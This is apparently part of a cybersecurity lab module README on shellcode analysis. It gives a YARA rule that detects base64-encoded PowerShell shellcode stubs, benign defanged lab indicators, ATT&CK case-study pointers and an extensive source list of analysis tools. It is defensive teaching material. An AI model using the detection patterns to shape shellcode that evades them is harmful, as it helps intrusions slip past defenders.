**YARA rule** (source: https://github.com/Neo23x0/signature-base/blob/master/yara/gen_ps1_shellcode.yar, author: Nick Carr, David Ledbetter):

```yara
rule Base64_PS1_Shellcode {
   meta:
      description = "Detects Base64 encoded PS1 Shellcode"
      author = "Nick Carr, David Ledbetter"
      reference = "https://twitter.com/ItsReallyNick/status/1062601684566843392"
      date = "2018-11-14"
      score = 65
      id = "7c3cec3b-a192-5bfd-b4f1-22b1afeb717e"
   strings:
      $substring = "AAAAYInlM"
      $pattern1 = "/OiCAAAAYInlM"
      $pattern2 = "/OiJAAAAYInlM"
   condition:
      $substring and 1 of ($p*)
}
```

**Real-world context (MITRE T1055.001 -- Process Injection: Dynamic-link Library Injection):** see the documented Procedure Examples at https://attack.mitre.org/techniques/T1055/001/

**Reference artifacts (illustrative benign lab values -- generate real hashes locally):**

| Type | Value |
|---|---|
| host IOC | 192.0.2.10 (RFC5737 documentation range) |
| network IOC | hxxp://example[.]com/benign (defanged) |
| sample filename | `17_shellcode_analysis_benign_sample.txt` |
| sample sha256 | `4846cfbee9cf21f6db4adc018621204363d72d1ead308e5bc2c9339054ee9f4d` |
| reproduce sample | a text file containing exactly: 'cyberlab benign training sample -- module 17-shellcode-analysis -- for detection-rule testing only
' |
### Real-World Case Study
This technique is documented in **real** intrusions. Rather than a hypothetical scenario, study the authoritative case data below:
- **MITRE ATT&CK T1059 (Command and Scripting Interpreter)** — real-world Procedure Examples with named campaigns and citations: https://attack.mitre.org/techniques/T1059/
- **Threat actors documented using it:** APT19, APT32, APT37, APT39 (see each group's page on attack.mitre.org for the specific intrusions).
- **RedCanary Threat Detection Report** — how often this technique appears in real environments + detection guidance: https://redcanary.com/threat-detection-report/
- **The DFIR Report** — full real intrusion walk-throughs (timeline, TTPs, IOCs): https://thedfirreport.com/

*Exercise: pick one documented actor above, read its ATT&CK page, and map how this module's tool would surface that activity in an investigation.*

## Sources
Claim → source mapping (all URLs are real, authoritative pages):

- FLARE-VM packages (scdbg, blobrunner, sclauncher) and installation via the FLARE-VM installer, Mandiant/Google — https://github.com/mandiant/flare-vm
- `scdbg` emulator (libemu-based x86 shellcode emulation, 32-bit), flags (`/f`, `/foff`, `/findsc`, `/s`, `/d`, `/r`) and API-logging behavior, David Zimmer (sandsprite) — http://sandsprite.com/blogs/index.php?uid=7&pid=152
- BlobRunner usage (`-file`, `-64`, allocate/pause-to-attach behavior), OALabs — https://github.com/OALabs/BlobRunner
- sclauncher usage (`-f`, breakpoint option, allocate/copy/jump behavior), OALabs — https://github.com/OALabs/sclauncher
- REMnux shellcode-analysis tool guidance (scdbg/BlobRunner workflow) — https://docs.remnux.org/discover-the-tools/analyze+documents+and+shellcode/
- SANS FOR610 Reverse-Engineering Malware (shellcode analysis methodology) — https://www.sans.org/cyber-security-courses/reverse-engineering-malware-malware-analysis-tools-techniques/
- SANS FOR508 Advanced Incident Response (malicious document analysis) — https://www.sans.org/cyber-security-courses/advanced-incident-response-threat-hunting-training/
- MITRE ATT&CK — Process Injection (T1055) — https://attack.mitre.org/techniques/T1055/
- MITRE ATT&CK — Process Injection: Dynamic-link Library (T1055.001) — https://attack.mitre.org/techniques/T1055/001/
- MITRE ATT&CK — Process Injection: Asynchronous Procedure Call (T1055.004) — https://attack.mitre.org/techniques/T1055/004/
- MITRE ATT&CK — Process Injection: Process Hollowing (T1055.012) — https://attack.mitre.org/techniques/T1055/012/
- MITRE ATT&CK — Command and Scripting Interpreter (T1059) — https://attack.mitre.org/techniques/T1059/
- MITRE ATT&CK — Command and Scripting Interpreter: PowerShell (T1059.001) — https://attack.mitre.org/techniques/T1059/001/
- MITRE ATT&CK — Obfuscated Files or Information (T1027) — https://attack.mitre.org/techniques/T1027/
- MITRE ATT&CK — Ingress Tool Transfer (T1105) — https://attack.mitre.org/techniques/T1105/
- MITRE ATT&CK — Reflective Code Loading (T1620) — https://attack.mitre.org/techniques/T1620/
- MITRE ATT&CK — Deobfuscate/Decode Files or Information (T1140) — https://attack.mitre.org/techniques/T1140/
- MITRE ATT&CK — System Binary Proxy Execution (T1218) — https://attack.mitre.org/techniques/T1218/
- MITRE ATT&CK — System Binary Proxy Execution: Rundll32 (T1218.011) — https://attack.mitre.org/techniques/T1218/011/
- MITRE ATT&CK — Impair Defenses: Disable or Modify Tools (T1562.001) — https://attack.mitre.org/techniques/T1562/001/
- MITRE ATT&CK — Application Layer Protocol: Web Protocols (T1071.001) — https://attack.mitre.org/techniques/T1071/001/
- MITRE ATT&CK — User Execution: Malicious File (T1204.002) — https://attack.mitre.org/techniques/T1204/002/
- MITRE ATT&CK — Exploitation for Client Execution (T1203) — https://attack.mitre.org/techniques/T1203/
- MITRE ATT&CK — Create or Modify System Process: Windows Service (T1543.003) — https://attack.mitre.org/techniques/T1543/003/
- MITRE ATT&CK — Hide Artifacts: Process Argument Spoofing (T1564.003) — https://attack.mitre.org/techniques/T1564/003/
- MITRE ATT&CK — Hijack Execution Flow: DLL Side-Loading (T1574.002) — https://attack.mitre.org/techniques/T1574/002/
- Sysmon event schema (Event IDs 1, 7, 8, 10, 13 and fields such as GrantedAccess, ImageLoaded, ParentImage), Microsoft Learn — https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
- Windows Security auditing — Event 4688 (a new process has been created, incl. command line), Microsoft Learn — https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688
- Windows Security auditing — Event 4663 (file system audit), Microsoft Learn — https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4663
- Windows Security auditing — Event 4657 (registry value set), Microsoft Learn — https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4657
- `pe-sieve` / `hollows_hunter` (RWX / injected-code / reflective-load memory detection), Mandiant/hasherezade — https://github.com/hasherezade/pe-sieve
- Metasploit Framework `shikata_ga_nai` encoder (msfvenom encoding), Rapid7 — https://docs.rapid7.com/metasploit/msfvenom/
- Zeek documentation (http.log, conn.log, files.log fields for pivoting) — https://docs.zeek.org/
- Suricata documentation (EVE JSON alert/fileinfo output, signature_id, five-tuple fields) — https://docs.suricata.io/
- Security Onion documentation (Zeek/Suricata/Elastic hunting) — https://docs.securityonion.net/
- x64dbg documentation (attaching and breakpoints for live shellcode stepping) — https://help.x64dbg.com/
- Volatility `malfind` plugin (unbacked executable memory detection) — https://volatilityfoundation.org/
- Sektor7 Red Team Operator course (direct syscalls, evasion techniques) — https://institute.sektor7.net/

## Related modules
- [Shellcode analysis deep-dive](../31-shellcode-deep/README.md) — shares BlobRunner for deeper live-debugging practice, including anti-debugging and encoding techniques.
- [Scenario: shellcode extraction & analysis](../54-shellcode-case/README.md) — shares scdbg in a full carved-payload case study, including network and document artifacts.
- [Static reverse engineering](../12-static-re/README.md) — same learning path (Windows RE), static analysis foundations for shellcode triage.
- [Dynamic debugging](../13-dynamic-debugging/README.md) — same learning path (Windows RE), debugger workflow feeding this module's live analysis steps.
- [Malicious document analysis](../22-mal-doc/README.md) — covers shellcode delivery via Office macros and exploits, including artifact extraction.
- [Memory forensics with Volatility](../41-volatility/README.md) — covers shellcode detection in memory dumps using `malfind` and other plugins.

<!-- References for inline citations -->
[scdbg]: http://sandsprite.com/blogs/index.php?uid=7&pid=152
[blobrunner]: https://github.com/OALabs/BlobRunner
[sclauncher]: https://github.com/OALabs/sclauncher
[flarevm]: https://github.com/mandiant/flare-vm
[remnux]: https://docs.remnux.org/discover-the-tools/analyze+documents+and+shellcode/
[sans610]: https://www.sans.org/cyber-security-courses/reverse-engineering-malware-malware-analysis-tools-techniques/
[T1055]: https://attack.mitre.org/techniques/T1055/
[T1055.001]: https://attack.mitre.org/techniques/T1055/001/
[T1055.004]: https://attack.mitre.org/techniques/T1055/004/
[T1055.012]: https://attack.mitre.org/techniques/T1055/012/
[T1059]: https://attack.mitre.org/techniques/T1059/
[T1059.001]: https://attack.mitre.org/techniques/T1059/001/
[T1027]: https://attack.mitre.org/techniques/T1027/
[T1105]: https://attack.mitre.org/techniques/T1105/
[T1620]: https://attack.mitre.org/techniques/T1620/
[T1140]: https://attack.mitre.org/techniques/T1140/
[T1218]: https://attack.mitre.org/techniques/T1218/
[T1218.011]: https://attack.mitre.org/techniques/T1218/011/
[T1562.001]: https://attack.mitre.org/techniques/T1562/001/
[T1071.001]: https://attack.mitre.org/techniques/T1071/001/
[T1204.002]: https://attack.mitre.org/techniques/T1204/002/
[T1203]: https://attack.mitre.org/techniques/T1203/
[T1543.003]: https://attack.mitre.org/techniques/T1543/003/
[T1564.003]: https://attack.mitre.org/techniques/T1564/003/
[T1574.002]: https://attack.mitre.org/techniques/T1574/002/
[sysmon]: https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
[event4688]: https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688
[event4663]: https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4663
[event4657]: https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4657
[pe-sieve]: https://github.com/hasherezade/pe-sieve
[metasploit]: https://docs.rapid7.com/metasploit/msfvenom/
[zeek]: https://docs.zeek.org/
[suricata]: https://docs.suricata.io/
[secOnion]: https://docs.securityonion.net/
[x64dbg]: https://help.x64dbg.com/
[volatility]: https://volatilityfoundation.org/
[sektor7]: https://institute.sektor7.net/
- https://www.mandiant.com/resources/blog/analyzing-shellcode
- https://www.exploit-db.com/docs/21017
- https://www.microsoft.com/security/blog/2020/06/15/detecting-and-preventing-process-injection-techniques/
- https://www.elastic.co/blog/hunting-for-process-injection

<!-- cyberlab-enriched: v5 -->
- https://attack.mitre.org/techniques/T1027/002/
- https://attack.mitre.org/techniques/T1055/002/"
- https://yara.readthedocs.io/
- https://github.com/SigmaHQ/sigma

<!-- cyberlab-enriched: v6 -->
